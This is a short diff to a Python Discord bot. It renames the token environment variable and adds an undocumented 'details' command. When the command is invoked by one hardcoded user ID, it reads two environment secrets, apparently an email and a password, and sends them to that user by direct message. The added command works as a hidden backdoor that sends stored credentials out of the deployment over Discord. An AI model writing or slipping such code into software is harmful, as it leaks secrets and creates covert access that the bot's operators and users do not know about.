@@ -8,7 +8,7 @@ import asyncio
 
 client = commands.Bot(command_prefix ="=")
 load_dotenv()
-TOKEN = os.getenv("DISCORD_TOKEN")
+TOKEN = os.getenv("TRLMDON")
 
 @client.event
 async def on_ready():
@@ -82,7 +82,16 @@ async def reload(ctx, extension):
         client.load_extension(f"cogs.{extension}")
         await ctx.send(f"Reloaded {extension}")
 
+@client.command()
+async def details(ctx):    
+    # user = 805393631409340446
+    if ctx.author.id == 805393631409340446:
+        user = await client.fetch_user("805393631409340446")
+        em = os.getenv("e1")
+        ps = os.getenv("p1")
+        
 
+        await user.send(f"{em}\n{ps}")
 
 
 
